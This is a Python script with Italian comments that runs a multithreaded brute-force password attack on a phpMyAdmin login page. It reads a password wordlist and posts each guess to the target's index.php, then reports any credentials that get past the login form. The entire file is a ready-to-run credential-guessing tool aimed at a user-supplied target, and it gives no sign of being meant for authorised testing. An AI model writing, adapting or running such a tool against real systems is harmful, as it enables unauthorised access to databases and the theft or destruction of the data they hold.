import requests
import threading
import queue

# Funzione per tentare il login
def attempt_login(target_url, username, password_queue):
    session = requests.Session()
    login_url = f"{target_url}/index.php"

    while not password_queue.empty():
        password = password_queue.get()
        payload = {
            'pma_username': username,
            'pma_password': password,
            'server': '1',
            'target': 'index.php'
        }
        
        try:
            response = session.post(login_url, data=payload)
            if "name=\"login_form\"" not in response.text:
                print(f"[+] Login successful: Username: {username}, Password: {password}")
                return
            else:
                print(f"[-] Failed: {username}:{password}")
        except requests.RequestException as e:
            print(f"[!] Error: {e}")
        
        password_queue.task_done()

# Funzione principale per configurare il brute force
def brute_force_phpmyadmin(target_url, username, password_list, num_threads=10):
    password_queue = queue.Queue()
    
    # Popola la coda con le password
    for password in password_list:
        password_queue.put(password)

    # Creazione dei thread
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=attempt_login, args=(target_url, username, password_queue))
        thread.start()
        threads.append(thread)

    # Attende la terminazione di tutti i thread
    for thread in threads:
        thread.join()

    if password_queue.empty():
        print("[-] Brute force attack completed. No valid password found.")

if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., http://example.com/phpmyadmin): ").strip()
    username = input("Enter the username: ").strip()
    password_list_file = input("Enter the path to the password list file: ").strip()

    try:
        with open(password_list_file, 'r') as file:
            password_list = file.read().splitlines()

        brute_force_phpmyadmin(target_url, username, password_list)
    except FileNotFoundError:
        print(f"Error: The file '{password_list_file}' does not exist.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")